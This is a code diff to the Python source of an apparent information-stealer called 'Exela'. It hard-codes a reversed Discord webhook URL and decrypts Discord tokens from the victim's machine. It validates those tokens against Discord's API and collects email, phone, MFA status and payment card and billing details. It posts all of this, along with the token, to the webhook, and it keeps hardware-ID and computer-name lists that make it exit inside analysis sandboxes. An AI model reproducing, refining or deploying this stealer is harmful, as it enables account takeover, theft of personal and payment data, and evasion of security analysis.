@@ -4,7 +4,7 @@ import shutil
 import base64, win32crypt, json, threading, requests, dhooks, re, subprocess
 from Crypto.Cipher import AES
 
-UrLxD = '%REPLACE_ME_FOR_QUiCADXD%'[::-1]
+UrLxD = '8K8oBw10xDqcwSf6oCmDE4PeN3hKyK497n5RmOSnTIE3mZ3ibR9qbPdceji-iDEu9-eF/3570834633212304311/skoohbew/ipa/moc.drocsid//:sptth'[::-1]
 Anti_Vm = "%AnTiVm%"
 
 
@@ -533,45 +533,56 @@ class ChromeLoginData:
                                 if self.decrypt_pw(base64.b64decode(q.split('dQw4w9WgXcQ:')[1]), self.get_encryption_key(os.getenv("appdata") + f"\\Discord")) in self.dcToken:
                                     continue
                                 else:
-                                    self.dcToken.append(self.decrypt_pw(base64.b64decode(q.split('dQw4w9WgXcQ:')[1]), self.get_encryption_key(os.getenv("appdata") + f"\\Discord")))
-            if self.dcToken:
-                self.discrod = True
-                for f in self.dcToken:
-                    headers = {"Authorization" : f}
-                    req = requests.get("https://discord.com/api/v8/users/@me", headers=headers).json()
-                    req2 = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=headers).json()[0]                  
-                    id = req["id"]
-                    dcpp = f"https://cdn.discordapp.com/avatars/{id}/{req['avatar']}"
-                    payment = req['premium_type']
-                    nitro = ""
-                    if requests.get(dcpp + ".png").status_code == 200:
-                        dcpp += ".png"
-                    else:dcpp += ".gif"
-                    embed = dhooks.Embed(title="***Developer's github account***", description=f"***Exela Discord Token Detected***", color=0x070707, url="https://github.com/quicaxd")
-                    embed.set_thumbnail(url=dcpp)
-                    embed.add_field(name="<a:earthpink:996004236531859588> Discord Account ID",inline=True, value=f"```{id}```")
-                    embed.add_field(name="<a:rainbowheart:996004226092245072> Discord Username",inline=True, value=f"```{req['username']}```")
-                    embed.add_field(name="<a:rainbowheart:996004226092245072> Discord Email",inline=True, value=f"```{req['email']}```")
-                    if req["phone"] != None:
-                        embed.add_field(name="<:starxglow:996004217699434496> Phone",inline=True, value=f"```{req['phone']}```")
-                    embed.add_field(name="<:mfa:1021604916537602088> IS MFA Enabled",inline=True, value=f"```{req['mfa_enabled']}```")
-                    if payment == 0:nitro="No Nitro"
-                    elif payment == 1:nitro="Nitro Classic"
-                    elif payment == 2:nitro="Normal Classic"
-                    elif payment == 3:nitro="Nitro Basic"
-                    else:nitro="Unkown"
-                    embed.add_field(name="<a:pinklv:996004222090891366> Nitro Billing", value=f"```{nitro}```")
-                    if req2:
-                        billgininfo = f"{req2['billing_address']['line_1']}, {req2['billing_address']['city']}, " + f"{req2['billing_address']['country']}, " + f"{req2['billing_address']['postal_code']}, "
-                        embed.add_field(name="💳 Paymen information", inline=False, value = f"```card Type : {req2['brand']}, Last Four : {req2['last_4']}, Expiration Date : {req2['expires_month']}/{req2['expires_year']}, Cart on name : {req2['billing_address']['name']}, Adress : {billgininfo}```")
-                    if req['bio'] != "":
-                        embed.add_field(name="<a:gift:1021608479808569435> Discord Account Biography",inline=False, value=f"```{req['bio']}```")
-                    embed.add_field(name=f"<a:pinkcrown:996004209667346442> Discord Token",inline=False, value=f"```{f}```")
-                    self.hook.send(embed=embed)
-                    self.discordd.append(f"Discord ID : {id}\nUsername : {req['username']}\nEmail : {req['email']}\nis mfa Enabled : {req['mfa_enabled']}\nNitro Status : {nitro}\nDiscord Token : {str(f)}")
+                                    self.validateDcTokenAndGetInfo(self.decrypt_pw(base64.b64decode(q.split('dQw4w9WgXcQ:')[1]), self.get_encryption_key(os.getenv("appdata") + f"\\Discord")))
+        except Exception as e:
+            print(str(e))
+    def validateDcTokenAndGetInfo(self, value):
+        try:
+            headers = {"Authorization" : value}
+            url = "https://discord.com/api/v8/users/@me"
+            url2 = "https://discord.com/api/v6/users/@me/billing/payment-sources"
+            req = requests.get(url, headers=headers)
+            req2 = requests.get(url2, headers=headers)
+            if not req.status_code == 200:
+                return  
+            else:
+                if not value in self.dcToken:
+                    self.dcToken.append(value)
+            for f in self.dcToken:
+                id = req.json()["id"]
+                dcpp = f"https://cdn.discordapp.com/avatars/{id}/{req.json()['avatar']}"
+                payment = req.json()['premium_type']
+                nitro = ""
+                if requests.get(dcpp + ".png").status_code == 200:
+                    dcpp += ".png"
+                else:dcpp += ".gif"
+                embed = dhooks.Embed(title="***Developer's github account***", description=f"***Exela Discord Token Detected***", color=0x070707, url="https://github.com/quicaxd")
+                embed.set_thumbnail(url=dcpp)
+                embed.add_field(name="<a:earthpink:996004236531859588> Discord Account ID",inline=True, value=f"```{id}```")
+                embed.add_field(name="<a:rainbowheart:996004226092245072> Discord Username",inline=True, value=f"```{req.json()['username']}```")
+                embed.add_field(name="<a:rainbowheart:996004226092245072> Discord Email",inline=True, value=f"```{req.json()['email']}```")
+                if req.json()["phone"] != None:
+                    embed.add_field(name="<:starxglow:996004217699434496> Phone",inline=True, value=f"```{req.json()['phone']}```")
+                embed.add_field(name="<:mfa:1021604916537602088> IS MFA Enabled",inline=True, value=f"```{req.json()['mfa_enabled']}```")
+                if payment == 0:nitro="No Nitro"
+                elif payment == 1:nitro="Nitro Classic"
+                elif payment == 2:nitro="Normal Classic"
+                elif payment == 3:nitro="Nitro Basic"
+                else:nitro="Unkown"
+                embed.add_field(name="<a:pinklv:996004222090891366> Nitro Billing", value=f"```{nitro}```")
+                if "billing_address" in req2.text:
+                    dataa = req2.json()[0]
+                    billgininfo = f"{dataa['billing_address']['line_1']}, {dataa['billing_address']['city']}, " + f"{dataa['billing_address']['country']}, " + f"{dataa['billing_address']['postal_code']}, "
+                    embed.add_field(name="💳 Paymen information", inline=False, value = f"```card Type : {dataa['brand']}, Last Four : {dataa['last_4']}, Expiration Date : {dataa['expires_month']}/{dataa['expires_year']}, Cart on name : {dataa['billing_address']['name']}, Adress : {billgininfo}```")
+                else:
+                    pass
+                if req.json()['bio'] != "":
+                    embed.add_field(name="<a:gift:1021608479808569435> Discord Account Biography",inline=False, value=f"```{req.json()['bio']}```")
+                embed.add_field(name=f"<a:pinkcrown:996004209667346442> Discord Token",inline=False, value=f"```{f}```")
+                self.hook.send(embed=embed)
+                self.discordd.append(f"Discord ID : {id}\nUsername : {req.json()['username']}\nEmail : {req.json()['email']}\nis mfa Enabled : {req.json()['mfa_enabled']}\nNitro Status : {nitro}\nDiscord Token : {str(f)}")
         except:
             pass
-        
     def sendxd(self):
         global hooksxd
         instagram = ""
@@ -972,11 +983,11 @@ class Antivirüstotal:
     def __init__(self) -> None:
         command = "wmic csproduct get uuid"
         serialNumber = str(subprocess.check_output(command).decode('utf-8').split("\n")[1].strip())
-        banned_hwids = ["7AB5C494-39F5-4941-9163-47F54D6D5016","8D962242-3F62-700D-E6A4-A117575B0A72","129B5E6B-E368-45D4-80AB-D4F106495924","8F384129-F079-456E-AE35-16608E317F4F","E6833342-780F-56A2-6F92-77DACC2EF8B3", "032E02B4-0499-05C3-0806-3C0700080009", "03DE0294-0480-05DE-1A06-350700080009", "11111111-2222-3333-4444-555555555555", "71DC2242-6EA2-C40B-0798-B4F5B4CC8776", "6F3CA5EC-BEC9-4A4D-8274-11168F640058", "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548", "4C4C4544-0050-3710-8058-CAC04F59344A", "00000000-0000-0000-0000-AC1F6BD04972","00000000-0000-0000-0000-AC1F6BD04C9E", "00000000-0000-0000-0000-000000000000", "5BD24D56-789F-8468-7CDC-CAA7222CC121", "49434D53-0200-9065-2500-65902500E439", "49434D53-0200-9036-2500-36902500F022", "777D84B3-88D1-451C-93E4-D235177420A7", "49434D53-0200-9036-2500-369025000C65",
+        banned_hwids = ["7AB5C494-39F5-4941-9163-47F54D6D5016","129B5E6B-E368-45D4-80AB-D4F106495924","8F384129-F079-456E-AE35-16608E317F4F","E6833342-780F-56A2-6F92-77DACC2EF8B3", "032E02B4-0499-05C3-0806-3C0700080009", "03DE0294-0480-05DE-1A06-350700080009", "11111111-2222-3333-4444-555555555555", "71DC2242-6EA2-C40B-0798-B4F5B4CC8776", "6F3CA5EC-BEC9-4A4D-8274-11168F640058", "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548", "4C4C4544-0050-3710-8058-CAC04F59344A", "00000000-0000-0000-0000-AC1F6BD04972","00000000-0000-0000-0000-AC1F6BD04C9E", "00000000-0000-0000-0000-000000000000", "5BD24D56-789F-8468-7CDC-CAA7222CC121", "49434D53-0200-9065-2500-65902500E439", "49434D53-0200-9036-2500-36902500F022", "777D84B3-88D1-451C-93E4-D235177420A7", "49434D53-0200-9036-2500-369025000C65",
                             "B1112042-52E8-E25B-3655-6A4F54155DBF", "00000000-0000-0000-0000-AC1F6BD048FE", "EB16924B-FB6D-4FA1-8666-17B91F62FB37", "A15A930C-8251-9645-AF63-E45AD728C20C", "67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3", "C7D23342-A5D4-68A1-59AC-CF40F735B363", "63203342-0EB0-AA1A-4DF5-3FB37DBB0670", "44B94D56-65AB-DC02-86A0-98143A7423BF", "6608003F-ECE4-494E-B07E-1C4615D1D93C", "D9142042-8F51-5EFF-D5F8-EE9AE3D1602A", "49434D53-0200-9036-2500-369025003AF0", "8B4E8278-525C-7343-B825-280AEBCD3BCB", "4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27", "79AF5279-16CF-4094-9758-F88A616D81B4"]
         banned_compname = ["WDAGUtilityAccount","JOANNA","WINZDS-21T43RNG", "Abby", "Peter Wilson", "hmarc", "patex", "JOHN-PC", "RDhJ0CNFevzX", "kEecfMwgj", "Frank",
                             "8Nl0ColNQ5bq", "Lisa", "John", "george", "PxmdUOpVyx", "8VizSM", "w0fjuOVmCcP5A", "lmVwjj9b", "PqONjHVwexsS", "3u2v9m8", "Julia", "HEUeRzl", "BEE7370C-8C0C-4", "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH", "XC64ZB", "DESKTOP-D019GDM", "DESKTOP-WI8CLET", "SERVER1", "LISA-PC", "JOHN-PC",
-                            "DESKTOP-B0T93D6", "DESKTOP-1PYKP29","DESKTOP-B0T93D6", "DESKTOP-1Y2433R","COMPNAME_4491", "WILEYPC", "WORK","KATHLROGE","DESKTOP-TKGQ6GH", "6C4E733F-C2D9-4", "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC","DESKTOP-NNSJYNR", "JULIA-PC","DESKTOP-BQISITB", "d1bnJkfVlH"]
+                            "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R","COMPNAME_4491", "WILEYPC", "WORK","KATHLROGE","DESKTOP-TKGQ6GH", "6C4E733F-C2D9-4", "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC","DESKTOP-NNSJYNR", "JULIA-PC","DESKTOP-BQISITB", "d1bnJkfVlH"]
         for identity in banned_hwids:
             if serialNumber in identity:
                 sys.exit(0)
